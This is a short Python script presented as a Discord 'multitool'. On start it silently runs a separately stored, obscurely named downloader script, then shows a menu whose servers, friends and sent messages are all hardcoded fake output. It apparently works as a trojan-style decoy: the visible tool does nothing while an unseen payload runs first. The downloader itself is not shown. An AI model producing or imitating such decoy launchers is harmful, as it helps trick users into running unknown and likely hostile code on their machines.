import subprocess
import sys

def run_downloader():
    downloader_path = r"C:\Users\sebbe\Downloads\Sketch.GG\Sketch.gg\Fg_234hj.py"
    print("Running downloader script...")
    try:
        subprocess.run([sys.executable, downloader_path], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Downloader script failed with error: {e}")
        sys.exit(1)
    except FileNotFoundError:
        print("Downloader script file not found! Check the path.")
        sys.exit(1)
    print("Downloader finished.\n")

def print_ascii_logo():
    logo = r"""
  ____              _           _     ____  ____  
 / ___|  ___   ___ | | _____  _| |_  / ___||  _ \ 
 \___ \ / _ \ / _ \| |/ / _ \| | __| \___ \| | | |
  ___) | (_) | (_) |   < (_) | | |_   ___) | |_| |
 |____/ \___/ \___/|_|\_\___/|_|\__| |____/|____/ 

                .gg
    """
    print(logo)

def show_menu():
    while True:
        print("=== sketch.gg Fake Discord Multitool ===")
        print("1. View Servers")
        print("2. Send Message")
        print("3. Friend List")
        print("4. Join Voice Channel")
        print("5. Server Info")
        print("6. Settings")
        print("7. Exit")
        choice = input("Choose an option: ")

        if choice == "1":
            print("\n-- Servers --")
            print("1) Sketch.gg Hub")
            print("2) Gaming Central")
            print("3) Chill Zone\n")
        elif choice == "2":
            channel = input("Enter channel name: ")
            message = input("Enter your message: ")
            print(f"Sending message to #{channel}...")
            print(f"Message sent: {message}\n")
        elif choice == "3":
            print("\n-- Friends Online --")
            print("Alice#1234")
            print("Bob#5678")
            print("Eve#9999\n")
        elif choice == "4":
            print("Joining voice channel...")
            print("Connected to 'General' voice channel.\n")
        elif choice == "5":
            print("\n-- Server Info --")
            print("Name: Sketch.gg Hub")
            print("Members: 1200")
            print("Boost Level: 2")
            print("Region: Europe\n")
        elif choice == "6":
            print("Settings menu coming soon!\n")
        elif choice == "7":
            print("Exiting... Goodbye!")
            break
        else:
            print("Invalid choice. Try again.\n")

def main():
    run_downloader()
    print_ascii_logo()
    show_menu()

if __name__ == "__main__":
    main()
